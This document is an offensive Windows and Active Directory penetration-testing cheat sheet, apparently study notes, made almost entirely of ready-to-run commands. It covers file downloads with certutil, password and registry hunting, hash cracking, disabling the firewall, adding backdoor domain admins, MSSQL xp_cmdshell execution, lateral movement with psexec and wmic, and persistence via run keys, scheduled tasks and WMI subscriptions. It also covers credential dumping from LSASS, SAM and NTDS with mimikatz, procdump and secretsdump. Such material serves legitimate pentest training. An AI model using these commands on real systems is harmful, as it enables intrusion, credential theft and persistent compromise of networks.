- PowerView Cheat Sheet
### File transfers
- Powershell
```
powershell -command Invoke-WebRequest -Uri <URL> -Outfile C:\\temp\\<FILE>
```
```
iwr -uri <URL> -Outfile <FILE>
```
```
certutil -urlcache -split -f "<URL>" <FILE>
```
```
copy \\kali\share\file .
```
### Recursive File Listing
```
dir /s /a \\<HOST>\<PATH> > <LOGFILE>
```
```
forfiles /s /c "cmd /c echo @path" /p <PATH> > <LOGFILE>
```
```
makeab <LOGFILE> <COMPRESSED>.zip
```
```
extract <COMPRESSED>.zip <LOGFILE>
```
### Powershell History
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
### Searching for Passwords
```
dir .s *pass* == *.config
```
```
findstr /si password *.xml *.ini *.txt
```
### Searching registry for passwords
```
reg query HKLM /f password /t REG_SZ /s
```
```
reg query HKCU /f password /t REG_SZ /s
```
### Find KDBX files
```
dir /s /b *.kdbx
```
```
Get-ChildItem -Recurse -Filter *.kdbx
```
### KDBX cracking
```
keepass2john database.kdbx > keepasshash
```
```
john --wordlist=/usr/share/wordlists/rockyou.txt keepasshash
```
### Enable Command Prompt
```
reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 0 /f
```
### Enable Remote Desktop
```
reg add "HKEY_LOCALMACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f
```
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```
```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
```
netsh advfirewall firewall set rule group="remote desktop" new enable=yes

OR

netsh advfirewall set allprofiles state off
```
```
sc start TermService
```
### User Creation
#### Local
```
net user <USERNAME> <PASSWORD> /add
```
```
net localgroup Administrators <USERNAME> /add
```
```
net localgroup "Remote Management Users" <USERNAME> /add
```
```
net localgroup "Remote Desktop Users" <USERNAME> /add
```
#### Domain
```
net user <USERNAME> <PASSWORD> /add /domain
```
```
net group "Domain Admins" <USERNAME> /add /domain
```
### Insecure Guest Authentication
- Enable
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v AllowInsecureGuestAuth /t REG_DWORD /d 1 /f
```
- Disable
```
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v AllowInsecureGuestAuth /f
```
```
shutdown /r /f /t 0
```
### Shares
```
SYSVOL ⇒ AD stuff (GPOs, logon scripts) C:\Windows\SYSVOL on DC
C ⇒ C:\
IPC ⇒ enumeration (admin scripts, event logs, etc)

dir \\[domain or ip]\[share] /user:[username] [password]
Note: domain ⇒ kerberos auth vs ip ⇒ NTLM auth
net use [drive letter]: \\[domain]\[share] /user:[username] [password] /persistent:yes
```
### LDAP
```
ldapdomaindump ldap://<HOST> -u '<DOMAIN>\<USER>' -p <PASSWORD> -o <DIR>
```
```
ldapsearch -x -H ldap://<HOST> -b base namingcontexts
```
```
ldapsearch -x -H ldap://<HOST> -D '<DOMAIN>\<USER>' -w <PASSWORD> -b "DC=<SUBDOMAIN>,DC=<TLD>"
```
### Kerberos
```
kerbrute userenum --dc <DC_IP> -d <DOMAIN> <USERLIST> # run with --downgrade if there are issues
```
```
kerbrute passwordspray --dc <DC_IP> -d <DOMAIN> <USERLIST> <PASSWORD>
```
```
kerbrute bruteuser --dc <DC_IP> -d <DOMAIN> <PASSLIST> <USER>
```
```
kerbrute bruteforce --dc <DC_IP> -d <DOMAIN> <CREDSLIST> #credslist contains user:pass on each line
```
- Step-1 Enumeration Identify SPNs (Service Principal Names) using tools like impacket or PowerShell to query for accoutns with SPNs
```
#Impacket
python3 GetUserSPNs.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -request
```
```
#Powershell with PowerView
Get-domainUser -SPN
```
- Step 2 Extract kerberos tickets by using the spns to request service tickets (TGS) from the kerberos protocol
```
#Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt
```
```
#Impacket
python3 GetUserSPNs.py <DOMAIN>/<USERNAME>:<PASSWORD> -request -outputfile hashes.txt
```
```
#Invoke-Kerberoast
Invoke-Kerberoast -OutputFormat Hashcat | Out-File -Encoding ASCII hashes.txt
```
- Step 3 Crack the hash
```
#Hashcat
hashcat -m 1310 -a 0 hashes.txt wordlist.txt
```
```
#John
john --wordlist=wordlist.txt hashes.txt
```
### SQL
- MySQL
```
mysql -h <HOST> -P <PORT> -u <USERNAME> -p '<PASSWORD>'
```
- PostgreSQL
```
PGPASSWORD=<PASSWORD> pgsql -h <HOST> -p <PORT> -U <USERNAME>
```
### MSSQL
- Impacket
```
impacket-mssqlclient <DOMAIN>/<USERNAME>:<PASSWORD>@<HOST> -port <PORT> -windows-auth
```
- Interesting functions
```
use master;
EXEC sp_helprotect 'xp_cmdshell';
EXEC sp_helprotect 'xp_regread';
EXEC sp_helprotect 'xp_regwrite';
EXEC sp_helprotect 'xp_dirtree';
EXEC sp_helprotect 'xp_subdirs';
EXEC sp_helprotect 'xp_fileexist';
```
- Command Execution
```
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
EXEC sp_configure 'show advanced options', '1';  
RECONFIGURE WITH OVERRIDE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell <COMMAND>;
```
- Impersonate
```
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;
EXECUTE AS login = '<USER>'; <QUERY>;
EXECUTE AS login = '<USER>'; EXEC xp_cmdshell '<COMMAND>';
```
- Over Link
```
SELECT srvname, srvproduct, rpcout FROM master..sysservers;
SELECT * FROM OPENQUERY("[target (srvname)]", '[query]');
SELECT * FROM OPENQUERY("[target]", 'SELECT @@SERVERNAME; exec xp_cmdshell ''[command]''');
Note: When using xp_cmdshell with OpenQuery, prepend a dummy query before it or else it won’t work
```
### NFS
```
rpcinfo -p <HOST>
```
```
showmount -e <HOST>
```
```
mount <HOST>:<SHARE> /mnt/<DIR>
```
```
unmount /mnt/<DIR>
```
### WinRM
```
crackmapexec winrm <HOSTS> -u <USERNAME> -p <PASSWORD>
```
```
evil-winrm -i <HOST> -u <USERNAME> -p <PASSWORD>
```
```
evil-winrm -i <HOST> -u <USERNAME> -H <HASH>
```
```
KRB5CCNAME=[ticket].ccache
```
```
evil-winrm -i <HOST> -r <DOAMIN> -u <USERNAME>
```
- port 5985 is plaintest
- port 5986 is encrypted
- If port 5986 is open 
```
evil-winrm -i <IP> -u <USERNAME> -p <PASSWORD> -S
```
- Login with hash
```
evil-winrm -i <IP> -u <USERNAME> -H <NTLM_HASH>
```
- Login with key (c for public key and k for private key)
```
evil-winrm -i <IP> -c certificate.pem -k priv-key.pem -S
```
- Logs
```
evil-winrm -i <IP> -u <USERNAME> -p <PASSWORD> -l
```
- Running a binary example
```
evil-winrm -i <IP> -u <USERNAME> -p <PASSWORD> -e /opt/privsc/Bypass-4MSI
menu
Invoke-binary /opt/privsc/winPEASx64.exe
```
### RDP
```
xfreerdp /u:<DOMAIN>\\<USERNAME> /p:<PASSWORD> /v:<HOST> +clipboard /drive:<WINDOWS_SHARE_NAME>,<KALI_FOLDER>
```
```
xfreerdp /u:<DOMAIN?\\<USERNAME> /pth:<HASH> /v:<HOST> +clipboard /drive:<WINDOWS_SHARE_NAME>,<KALI_FOLDER>
```
```
rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD> <HOST>
```
- RDP brute force
```
hydra -l <USERNAME> -P <PASSWORD_LIST> -s <PORT> rdp://<HOST>
```
### VNC
```
vncviewer <HOST>:<PORT> -passwd <PASSWORD_FILE>
```
- VNC brute force
```
hydra -s <PORT> -P <PASSWORD_LIST> -t 4 <HOST> vnc
```
## Lateral Movement
### Remote Enumeration
```
net session \\<HOST>
```
```
reg query \\<HOST>\<KEY>...
```
```
net view \\<HOST>
```
```
dir \\<HOST>\<SHARE>
```
```
net use * \\<HOST>\<SHARE> /user:<DOMAIN>\<USERNAME> <PASSWORD>
```
```
tasklist /s <HOST>
```
### Movement
```
psexec \\<HOST> -u <USERNAME> -p <PASSWORD> -i <COMMAND>
```
```
winrs -u:<USERNAME> -p:<PASSWORD>  -r:<HOST> cmd
```
- Switch users (RUNAS)
```
runas /user:<DOMAIN>\<USERNAME> <COMMAND>
/netonly to keep the same user access on the local machine (only login for network connections)
/savecred to get creds from or save creds to Windows Credential Manager

runas <USERNAME> <PASSWORD> <COMMAND>
-d <DOMAIN>
-r <HOST>:<PORT> For reverse shell
-b -> Bypass UAC
```
- Create new process (WMI)
```
wmic /node:<IP> process call create <EXECUTABLE>
```
```
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -CimSession (New-CimSession -ComputerName "<IP>") .Arguments @{CommandLine="<Executable>"}
```
- Create New Service 
```
sc \\<HOST> create <SERVICE> binPath="<EXECUTABLE>" start=auto displayname="<NAME>"
```
```
sc \\<HOST> description <SERVICE> "<DESCRIPTION>"
```
```
sc \\<HOST> <START/STOP/DELETE> <SERVICE>
```
- Modify Existing Service
```
sc \\<HOST> qc vss -> Service now runs as LocalSystem
```
```
sc \\<HOST> query vss -> Service is currently not running
```
```
sc \\<HOST> config vss binpath="<EXECUTABLE>"
```
```
sc \\<HOST> <START/STOP> vss
```
- Create a Scheduled Task
```
schtasks /s <HOST> /ru <USER> /create /f /tn <NAME> /tr <COMMAND> /sc <ONCE> /sd 01/01/1970 /st 00:00
```
```
schtasks /s <HOST> /run /tn <NAME>
```
### Persistence
#### User Level
- To find more autorun options, check out Autoruns from SysInternals. This includes startup directories and registry keys
- Startup Directories
```
%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
#Executed when the current user logs in
```
```
%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
#Executed when any user logs in
```
- Registry Run Key
	- Runs when current user logs in
	- Upload exe file to somewhere in %USERPROFILE%\AppData\Roaming
```
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <NAME> /t REG_SZ /f /d "<PATH_TO_EXECUTABLE>"
```
- Registry Run Key
	- Runs when any user logs in
	- Upload exe file somewhere in C:\ProgramData
```
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v <NAME> /t REG_SZ /f /d "<PATH_TO_EXECUTABLE>"
```
- Scheduled Task
	- Upload file to somewhere in %USERPROFILE%\AppData\Roaming
```
schtasks /create /f /tn <NAME> /tr <PATH_TO_EXECUTABLE> /sc ONLOGON
```
```
schtasks /create /f /tn <NAME> /tr <PATH_TO_EXECUTABLE> /sc DAILY /st <HH:MM>
```
```
#Check with 
schtasks /query /tn <NAME> /fo /list /v

#Run manually with 
schtasks /run /tn <NAME>
```
#### System Level
- DLL hijacking
- Startup Service
	- Upload file to somewhere in %SystemRoot%\System32
		- Either upload a service executable or use "cmd /c start /b <EXECUTABLE" as your binpath
```
sc create <SERVICE> binPath="<EXECUTABLE>" start=auto displayname="<NAME>"
```
```
sc description <SERVICE> "<DESCRIPTION>"
```
```
sc <START/STOP/DELETE> <SERVICE>
```
- Scheduled Task
	- Upload exe file to somewhere in %SystemRoot%\System32
```
schtasks /create /f /tn <NAME> /ru system /tr <PATH_TO_EXECUTABLE> /sc ONSTART
```
```
schtasks /create /f /tn <NAME> /ru system /tr <PATH_TO_EXECUTABLE> /sc DAILY /st <HH:MM>
```
```
#Check with 
schtasks /query /tn <NAME> /fo list /v

#Run manually with 
schtasks /run /tn <NAME>
```
- WMI Event
	- Upload exe file to somewhere in %SystemRoot%\System32
```
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="<NAME>", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
```
```
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="<NAME>", ExecutablePath="<PATH_TO_EXECUTABLE>", COMMANDLINETEMPLATE="<EXECUTABLE>"
```
```
wmic /NAMESPACE:"\\root\subscription" PATJ __FilterToconsumerBinding CREATE Filter="__EventFilter.Name=\"<NAME>\"", Consumer="CommandLineEventConsumer.Name=\"<NAME>\""
```
### Credential Dumping
- hashes are stored in three places
	- SAM -> local user accounts
	- LSA -> domain user accounts
	- NTDS.dit -> everyone on domain (only stored on the domain controller)
- Local password checks
```
reg save HKLM\SAM "C:\Windows\Temp\sam.save"
```
```
reg save HKLM\SECURITY "C:\Windows\Temp\security.save"
```
```
reg save HKLM\SYSYSTEM "C:\Windows\Temp\system.save"
```
- Task manager
	- Right click lsass.exe -> create dump file
```
procdump -accepteula -ma lsass.exe lsass.dmp
```
- Control panel -> user accounts -> Credential manager
```
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```
- Mimikatz (run as administrator)
```
token::elevate
```
```
privilege::debug
```
```
#SAM hashes
lsadump::sam /patch
```
```
#LSA hashes
lsadump::lsa /patch
OR
lsadump::lsa /inject
```
```
#Hashes in LSASS memory
sekurlsa::msv
```
```
#Hashes for users logged in since last reboot
sekurlsa::logonpasswords

IF YOU SEE THE ERROR !+ !processprotect /process:lsass.exe /remove
TRY AGAIN
```
```
#Hashes in windows credential manager
sekurlsa::credman
```
```
#NTDS.dit
lsadump::dcsync /domain:<DOMAIN> /all /csv
```
- Impacket
```
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<HOST>
```
```
impacket-secretsdump <DOMAIN>/<USER>@<HOST> -hashes <HASH>
```
```
#Flags
-just-dc means only NTDS.dit data (NTLM hashes and kerberos keys)
-just-dc-ntlm means only NTDS.dit data (NTLM hashes only)
-sam <SAM_FILE> -system <SYSTEM_FILE> -security <SECURITY_FILE> local dumps directly from the sam
-ntds <NTDS_FILE> -system <SYSTEM_FILE> -security <SECURITY_FILE> local dumps directly from NTDS
-no-pass doesnt prompt for password and is used in conjunction with -k
-k <CCACHE_FILE> used for kerberos ticket
```
- Crackmapexec
```
crackmapexec smb <HOST> -u <USERNAME> -p <PASSWORD> --<SAM/LSA/NTDS>
```